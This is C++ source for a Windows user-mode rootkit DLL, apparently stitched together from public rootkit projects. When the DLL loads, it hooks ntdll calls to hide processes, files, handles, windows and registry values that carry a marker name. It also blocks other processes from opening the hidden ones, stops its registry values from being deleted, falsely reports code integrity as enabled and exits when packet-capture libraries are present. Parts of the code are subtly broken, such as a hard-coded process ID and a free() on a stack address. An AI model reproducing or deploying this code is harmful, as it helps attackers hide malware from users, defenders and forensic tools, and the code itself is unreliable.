#include <wtypes.h>
#include <winternl.h>
#include <Psapi.h>
#include "r77.h"
#include <string_view>


#define SYSCALL_INDEX( a )	( *( PULONG )( ( PUCHAR )a + 1 ) )


inline void AllocateUnicodeString(PUNICODE_STRING us, USHORT Size)
{
	if (!us)
		return;

	__try
	{
		us->Length = 0;
		us->MaximumLength = 0;
		us->Buffer = PWSTR(malloc(Size));
		if (us->Buffer)
		{
			us->Length = 0;
			us->MaximumLength = Size;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}
}

//
// Tools
//

bool GetProcessName(HANDLE PID, PUNICODE_STRING ProcessImageName)
{

	HANDLE Handle = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE,
		8036 /* This is the PID, you can find one from windows task manager */
	);
	if (Handle)
	{
		TCHAR Buffer[MAX_PATH];
		if (GetModuleFileNameExW(Handle, 0, ProcessImageName->Buffer, MAX_PATH))
		{
			// At this point, buffer contains the full path to the executable
		}
		else
		{
			// You better call GetLastError() here
		}
		CloseHandle(Handle);
	}
	return 0;
}

inline void SwapEndianness(PCHAR ptr, size_t size)
{
	struct u16
	{
		UCHAR high;
		UCHAR low;
	};

	for (u16* pStruct = (u16*)ptr; pStruct < (u16*)ptr + size / 2; pStruct++)
	{
		auto tmp = pStruct->low;
		pStruct->low = pStruct->high;
		pStruct->high = tmp;
	}
}

//
// Helpers
//
extern ULONG GetNtSyscall(LPCSTR FunctionName);
extern ULONG GetWin32Syscall(LPCSTR FunctionName);
extern PVOID GetImageTextSection(const ULONG64 uImageBase, ULONG* ulSectionSize);

//
// Misc
//


extern bool DumpMZ(PUCHAR pImageBase);
extern void UnloadImages();

struct FileDirectoryInformationEx
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	WCHAR FileName[1];
};
enum class FileInformationClassEx
{
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileIdBothDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileValidDataLengthInformation,
	FileShortNameInformation,
	FileIoCompletionNotificationInformation,
	FileIoStatusBlockRangeInformation,
	FileIoPriorityHintInformation,
	FileSfioReserveInformation,
	FileSfioVolumeInformation,
	FileHardLinkInformation,
	FileProcessIdsUsingFileInformation,
	FileNormalizedNameInformation,
	FileNetworkPhysicalNameInformation,
	FileIdGlobalTxDirectoryInformation,
	FileIsRemoteDeviceInformation,
	FileUnusedInformation,
	FileNumaNodeInformation,
	FileStandardLinkInformation,
	FileRemoteProtocolInformation,
	FileRenameInformationBypassAccessCheck,
	FileLinkInformationBypassAccessCheck,
	FileVolumeNameInformation,
	FileIdInformation,
	FileIdExtdDirectoryInformation,
	FileReplaceCompletionInformation,
	FileHardLinkFullIdInformation,
	FileIdExtdBothDirectoryInformation,
	FileMaximumInformation
};
// hooks from r77 converted to ntdll

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_)(SYSTEM_INFORMATION_CLASS systemInformationClass, SystemProcessInformationEx* systemInformation, ULONG systemInformationLength, PULONG returnLength);
typedef NTSTATUS(NTAPI *NtQueryDirectoryFile_)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FileInformationClassEx FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
NtQuerySystemInformation_ oNtQuerySystemInformation;
NtQueryDirectoryFile_ oNtQueryDirectoryFile;

// latebros registry hooks
enum class KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation = 0,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
};
typedef NTSTATUS(NTAPI* NtDeleteValueKey_)(HANDLE key_handle, PUNICODE_STRING value_name);
typedef NTSTATUS(NTAPI* NtEnumerateValueKey_)(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length);
NtDeleteValueKey_ oNtDeleteValueKey;
NtEnumerateValueKey_ oNtEnumerateValueKey;

//
// win32k.sys hooks from masterhide
//

typedef HWND(NTAPI* NtUserFindWindowEx_)(HWND hWndParent, HWND hWndChildAfter, PUNICODE_STRING lpszClass, PUNICODE_STRING lpszWindow, DWORD dwType);
typedef NTSTATUS(NTAPI* NtUserBuildHwndList_)(HDESK hdesk, HWND hwndNext, ULONG fEnumChildren, DWORD idThread, UINT cHwndMax, HWND* phwndFirst, ULONG* pcHwndNeeded);
typedef HWND(NTAPI* NtUserQueryWindow_)(HWND window, HANDLE hwnd);
typedef HWND(NTAPI* NtUserGetForegroundWindow_)(VOID);
typedef HWND(NTAPI* NtUserQueryWindow_)(HWND, HANDLE);
typedef NTSTATUS(NTAPI* NtOpenProcess_)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* ClientId);
NtUserFindWindowEx_ oNtUserFindWindowEx;
NtUserBuildHwndList_ oNtUserBuildHwndList;
NtUserQueryWindow_ oNtUserQueryWindow;
NtUserGetForegroundWindow_ oNtUserGetForegroundWindow;
NtOpenProcess_ oNtOpenProcess;
//
// win32k.sys hooks
//
WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->FileName;
	default:
		return NULL;
	}
}
ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
	default:
		return 0;
	}
}
void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileFullDirectoryInformation:
		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileBothDirectoryInformation:
		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileNamesInformation:
		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	}
}
bool is_protected_entry(WCHAR *entry) {
	bool bResult = false;
	if (wcsstr(entry, _6829_STR)) {
		bResult = true;
	}
	return bResult;
}
bool IsProtectedProcess(HANDLE PID)
{
	UNICODE_STRING wsProcName{ };
	if (!GetProcessName(PID, &wsProcName))
		return false;

	bool bResult = false;
	if (wsProcName.Buffer)
	{
		if (wcsstr(wsProcName.Buffer, _6829_STR))
		{
			bResult = true;
		}
	}
	free(&wsProcName);
	return bResult;
}

bool IsProtectedProcess(PWCH Buffer)
{
	if (!Buffer)
		return false;

	if (wcsstr(Buffer, _6829_STR))
	{
		return true;
	}
	return false;
}

HANDLE __cdecl hkNtUserQueryWindow(HWND WindowHandle, HANDLE TypeInformation)
{
	const auto res = oNtUserQueryWindow(WindowHandle, TypeInformation);
	if (IsProtectedProcess(GetCurrentProcess()))
		return res;


	auto PID = oNtUserQueryWindow(WindowHandle, 0);
	if (IsProtectedProcess(PID))
		return 0;

	return res;
}

HWND NTAPI hkNtUserFindWindowEx(HWND hWndParent, HWND hWndChildAfter, PUNICODE_STRING lpszClass, PUNICODE_STRING lpszWindow, DWORD dwType)
{
	const auto res = oNtUserFindWindowEx(hWndParent, hWndChildAfter, lpszClass, lpszWindow, dwType);

	if (IsProtectedProcess(GetCurrentProcess()))
		return res;

	if (res)
	{
		auto PID = oNtUserQueryWindow(res, 0);
		if (IsProtectedProcess(PID))
		{
			return NULL;
		}
	}
	return res;
}

namespace globals
{
	//
	// Custom MAC Address
	//
	static UCHAR szFakeMAC[] = { 0x00, 0xFF, 0x9B, rand(), rand(), rand() };

	//
	// Custom HD Serial and Model
	//
	static char szFakeSerial[] = "XJEBA1973M2";

	wchar_t wsBlacklistedProcessess[1] = {
		//todo
	};
	static char* szProtectedDrivers[] =
	{
		"dbk64",
		"processhacker2",
		//...
	};
	DWORD PAGE_FAULT_FAILED = 0x00000114;

}
NTSTATUS __cdecl hkNtUserBuildHwndList(HDESK hdesk, HWND hwndNext, ULONG fEnumChildren, DWORD idThread, UINT cHwndMax, HWND* phwndFirst, ULONG* pcHwndNeeded)
{
	const auto res = oNtUserBuildHwndList(hdesk, hwndNext, fEnumChildren, idThread, cHwndMax, phwndFirst, pcHwndNeeded);

	if (IsProtectedProcess(GetCurrentProcess()))
		return res;

	if (fEnumChildren == 1)
	{
		auto PID = oNtUserQueryWindow(hwndNext, 0);
		if (IsProtectedProcess(PID))
			return globals::PAGE_FAULT_FAILED;
	}

	if (NT_SUCCESS(res))
	{
		ULONG i = 0;
		ULONG j;

		while (i < *pcHwndNeeded)
		{
			auto PID = oNtUserQueryWindow(phwndFirst[i], 0);
			if (IsProtectedProcess(PID))
			{
				for (j = i; j < (*pcHwndNeeded) - 1; j++)
					phwndFirst[j] = phwndFirst[j + 1];
				phwndFirst[*pcHwndNeeded - 1] = 0;
				(*pcHwndNeeded)--;
				continue;
			}
			i++;
		}
	}
	return res;
}

HWND LastForeWnd = HWND(-1);

HWND __cdecl hkNtUserGetForegroundWindow(VOID)
{
	const auto res = oNtUserGetForegroundWindow();

	if (IsProtectedProcess(GetCurrentProcess()))
		return res;

	auto PID = oNtUserQueryWindow(res, 0);
	if (IsProtectedProcess(PID))
		return LastForeWnd;
	else
		LastForeWnd = res;

	return res;
}
NTSTATUS hkNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FileInformationClassEx fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
	NTSTATUS status = oNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);

	if (NT_SUCCESS(status) && (fileInformationClass == FileInformationClassEx::FileDirectoryInformation || fileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || fileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || fileInformationClass == FileInformationClassEx::FileNameInformation))
	{
		PVOID pCurrent = fileInformation;
		PVOID pPrevious = NULL;

		do
		{
			if (wstring(GetFileDirEntryFileName(pCurrent, fileInformationClass)).find(_6829_STR) == 0)
			{
				if (GetFileNextEntryOffset(pCurrent, fileInformationClass) != 0)
				{
					int delta = (ULONG)pCurrent - (ULONG)fileInformation;
					int bytes = (DWORD)length - delta - GetFileNextEntryOffset(pCurrent, fileInformationClass);
					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + GetFileNextEntryOffset(pCurrent, fileInformationClass)), (DWORD)bytes);
					continue;
				}
				else
				{
					if (pCurrent == fileInformation)status = 0;
					else SetFileNextEntryOffset(pPrevious, fileInformationClass, 0);
					break;
				}
			}

			pPrevious = pCurrent;
			pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, fileInformationClass);
		} while (GetFileNextEntryOffset(pPrevious, fileInformationClass) != 0);
	}

	return status;
}

//
// ntoskrnl.exe hooks
//
NTSTATUS NTAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength)
{
	NTSTATUS status = oNtQuerySystemInformation(systemInformationClass, reinterpret_cast<SystemProcessInformationEx*>(systemInformation), systemInformationLength, returnLength);

	SystemProcessInformationEx* pCurrent;
	SystemProcessInformationEx* pNext = reinterpret_cast<SystemProcessInformationEx*>(systemInformation);
	if (NT_SUCCESS(status) && systemInformationClass == SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
	{
		do
		{
			pCurrent = pNext;
			pNext = (SystemProcessInformationEx*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (!_wcsnicmp(pNext->ImageName.Buffer, _6829_STR, min(pNext->ImageName.Length, 3)))
			{
				if (pNext->NextEntryOffset == 0) pCurrent->NextEntryOffset = 0;
				else pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset);
	}

	//
	// Hide from handle list
	//
	else if (systemInformationClass == 16) //SystemHandleInformation
	{
		if (!IsProtectedProcess(GetCurrentProcess()))
		{
			_SYSTEM_HANDLE_INFORMATION* pHandle = reinterpret_cast<_SYSTEM_HANDLE_INFORMATION*>(systemInformation);
			const auto pEntry = &pHandle->Handles[0];

			for (unsigned i = 0; i < pHandle->HandleCount; ++i)
			{
				if (!_wcsnicmp((const wchar_t*)pEntry[i].Object, _6829_STR, min(pNext->ImageName.Length, 3)))
				{
					const auto next_entry = i + 1;

					if (next_entry < pHandle->HandleCount)
						memcpy(&pEntry[i], &pEntry[next_entry], sizeof(_SYSTEM_HANDLE));
					else
					{
						memset(&pEntry[i], 0, sizeof(_SYSTEM_HANDLE));
						pHandle->HandleCount--;
					}
				}
			}
		}
	}
	else if (systemInformationClass == 0x40) //SystemExtendedHandleInformation
	{
			_SYSTEM_HANDLE_INFORMATION* pHandle = reinterpret_cast<_SYSTEM_HANDLE_INFORMATION*>(systemInformation);
			const auto pEntry = &pHandle->Handles[0];

			for (unsigned i = 0; i < pHandle->HandleCount; ++i)
			{
				if (IsProtectedProcess(ULongToHandle(pEntry[i].ProcessId)))
				{
					const auto next_entry = i + 1;

					if (next_entry < pHandle->HandleCount)
						memcpy(&pEntry[i], &pEntry[next_entry], sizeof(_SYSTEM_HANDLE));
					else
					{
						memset(&pEntry[i], 0, sizeof(_SYSTEM_HANDLE));
						pHandle->HandleCount--;
					}
				}
			
		}
	}
	//
	// Spoof code integrity status
	//
	else if (systemInformationClass == SystemCodeIntegrityInformation)
	{
		_SYSTEM_CODEINTEGRITY_INFORMATION* Integrity = reinterpret_cast<_SYSTEM_CODEINTEGRITY_INFORMATION*>(systemInformation);

		// Spoof test sign flag if present
		if (Integrity->CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
			Integrity->CodeIntegrityOptions &= ~CODEINTEGRITY_OPTION_TESTSIGN;

		// Set as always enabled.
		Integrity->CodeIntegrityOptions |= CODEINTEGRITY_OPTION_ENABLED;
	}

	return status;
}



NTSTATUS NTAPI hkNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, CLIENT_ID* ClientId)
{
	NTSTATUS ret = (NTSTATUS)oNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
	if (NT_SUCCESS(ret))
	{
		if (!IsProtectedProcess(GetCurrentProcess()))

			if (IsProtectedProcess(ClientId->UniqueProcess))
			{
				//DBGPRINT("Denying access from PID %p to PID %p\n", GetCurrentProcessId(), ClientId->UniqueProcess);
				NtClose(*ProcessHandle);
				*ProcessHandle = HANDLE(-1);
				return globals::PAGE_FAULT_FAILED;
			}
	}

	return ret;
}

/*
* Function: ntdll!NtDeleteValueKey
* Purpose: Protect any r6829 registry value from being deleted - from latebros
*
*/
NTSTATUS NTAPI hkNtDeleteValueKey(HANDLE key_handle, PUNICODE_STRING value_name)
{
	if (!value_name)
		return STATUS_INVALID_PARAMETER;

	if (!value_name->Buffer || is_protected_entry(value_name->Buffer))
		return STATUS_OBJECT_NAME_NOT_FOUND;

	// CALL	
	auto result = oNtDeleteValueKey(key_handle, value_name);

	return result;
}

/*
* Function: ntdll!NtEnumerateValueKey
* Purpose: hide any r6829 registry value from enumeration - from latebros
*
*/
struct KEY_VALUE_BASIC_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG NameLength;
	WCHAR Name[1];
};
struct KEY_VALUE_FULL_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG DataOffset;
	ULONG DataLength;
	ULONG NameLength;
	WCHAR Name[1];
};
NTSTATUS NTAPI hkNtEnumerateValueKey(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length)
{

	// WE NEED TO SAVE INDEXES NOT TO DISPLAY SAME KEY TWICE AFTER REPLACING THE HIDDEN ONES
	// THESE ARE UNIQUE TO EACH THREAD TO PREVENT MULTI-THREAD ISSUES
	thread_local int last_replaced = -1;
	thread_local HANDLE last_handle = key_handle;

	// WE ARE NOT ITERATING OVER A NEW KEYS LIST
	if (last_handle != key_handle)
	{
		last_handle = key_handle;
		last_replaced = -1;
	}

	// UPDATE THE INDEX TO BE AFTER THE VALUE WE REPLACED HIDDEN KEYS WITH
	if (static_cast<int>(index) <= last_replaced)
	{
		index = last_replaced + 1;
		++last_replaced;
	}

	NTSTATUS result;
	while (true)
	{
		// CALL	
		result = oNtEnumerateValueKey(key_handle, index, key_value_class, key_value_info, length, return_length);

		// SOMETHING FAILED OR WE REACHED THE END OF LIST
		if (!NT_SUCCESS(result))
		{
			// RESET THE INDEX OF LAST REPLACED REGISTRY VALUE
			last_replaced = -1;
			break;
		}

		std::wstring sv;
		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
		{

			if (is_protected_entry(static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info)->Name))
				last_replaced = index;
		}
		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
		{
			if(is_protected_entry(static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info)->Name))
				last_replaced = index;
		}
		else // PARTIAL INFORMATION DOESN'T CONTAIN THE NAME SO WE DONT REALLY CARE ABOUT IT
		{
			break;
		}

		// IF NOTHING IS FOUND WE BREAK OUT OF THE LOOP

		if (sv.find(_6829_STR) >= 0)
		{
			// UPDATE THE INDEX OF LAST REPLACEMENT
			break;
		}

		// ELSE CLEAR THE CURRENT HELD INFORMATION AND INCREASE THE INDEX TO CHECK NEXT VALUE
		std::memset(key_value_info, 0x00, length);
		++index;
	}


	return result;
}
void r6829_Initialize()
{
	CHAR Mutant[32];
	sprintf_s(Mutant, "%d:$6829", GetCurrentProcessId()); //Mutex == PID:$6829
	CreateMutexA(0, 0, Mutant);
	if (GetModuleHandleA("wpcap.dll") != NULL) //anti wpcap/npcap #1
		exit(1);
	if (GetModuleHandleA("packet.dll") != NULL) //anti wpcap/npcap #2
		exit(1);
	char szExePath[MAX_PATH + 1];
	GetModuleFileNameA(nullptr, szExePath, MAX_PATH);
	MH_Initialize();
	MH_CreateHookApi(L"ntdll.dll", "NtUserQueryWindow", &hkNtUserQueryWindow, reinterpret_cast<PVOID*>(&oNtUserQueryWindow));
	MH_CreateHookApi(L"ntdll.dll", "NtUserGetForegroundWindow", &hkNtUserGetForegroundWindow, reinterpret_cast<PVOID*>(&oNtUserGetForegroundWindow));
	MH_CreateHookApi(L"ntdll.dll", "NtOpenProcess", &hkNtOpenProcess, reinterpret_cast<PVOID*>(&oNtOpenProcess));
	MH_CreateHookApi(L"ntdll.dll", "NtQuerySystemInformation", &hkNtQuerySystemInformation, reinterpret_cast<PVOID*>(&oNtQuerySystemInformation));
	MH_CreateHookApi(L"ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, reinterpret_cast<PVOID*>(&oNtQueryDirectoryFile));
	MH_CreateHookApi(L"ntdll.dll", "NtEnumerateValueKey", &hkNtEnumerateValueKey, reinterpret_cast<PVOID*>(&oNtEnumerateValueKey));
	MH_CreateHookApi(L"ntdll.dll", "NtDeleteValueKey", &hkNtDeleteValueKey, reinterpret_cast<PVOID*>(&oNtDeleteValueKey));
	MH_EnableHook(MH_ALL_HOOKS);
}
bool __stdcall DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		r6829_Initialize();
	}
	return true;
}